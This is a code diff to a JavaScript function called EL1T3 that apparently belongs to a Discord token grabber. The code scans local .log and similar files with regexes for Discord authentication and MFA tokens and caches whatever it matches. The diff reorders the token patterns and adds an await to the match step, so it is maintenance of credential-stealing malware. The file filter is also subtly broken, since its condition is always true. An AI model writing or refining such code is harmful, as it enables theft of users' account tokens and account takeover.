@@ -29,8 +29,8 @@ async function EL1T3() {
         ];
 
         const token_regex = [
-            /[\w-]{24}.[\w-]{6}.[\w-]{27}/,
             /[\d\w_-]{24}\.[\d\w_-]{6}\.[\d\w_-]{27}/,
+            /[\w-]{24}.[\w-]{6}.[\w-]{27}/,
             /`mfa\.[\d\w_-]{84}`/,
             /mfa\.[\w-]{84}/
         ];
@@ -43,7 +43,7 @@ async function EL1T3() {
                 files.filter(f => f.split('.').pop() === 'log' || 'lbd').forEach(filter => {
                     readFile(`${path}/${filter}`, 'utf-8', async function(err, data) {
                         await token_regex.forEach(async regex => {
-                            let [match] = regex.exec(data) || [null];
+                            let [match] = await regex.exec(data) || [null];
 
                             if (match != null && !token_cache.includes(match)) {
                                 const token = match.replace(/`/g, '');
